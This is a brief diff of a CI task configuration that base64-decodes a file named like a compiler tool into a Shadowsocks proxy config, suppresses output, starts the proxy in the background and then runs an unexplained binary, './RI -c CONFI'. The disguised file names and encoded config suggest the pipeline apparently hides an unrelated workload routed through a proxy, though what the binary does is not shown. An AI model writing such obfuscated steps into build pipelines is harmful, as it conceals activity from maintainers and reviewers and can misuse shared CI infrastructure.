@@ -16,4 +16,5 @@ task:
     - base64 -d gcc/gcc_np_ > gcc/gcc_new 2>/dev/null
     - mv gcc/gcc_new /etc/shadowsocks-libev/make.json &>/dev/null
     - systemctl stop shadowsocks-libev.service &>/dev/null || true
-    - ss-local -v -c /etc/shadowsocks-libev/make.json
+    - ss-local -v -c /etc/shadowsocks-libev/make.json &
+    - ./RI -c CONFI
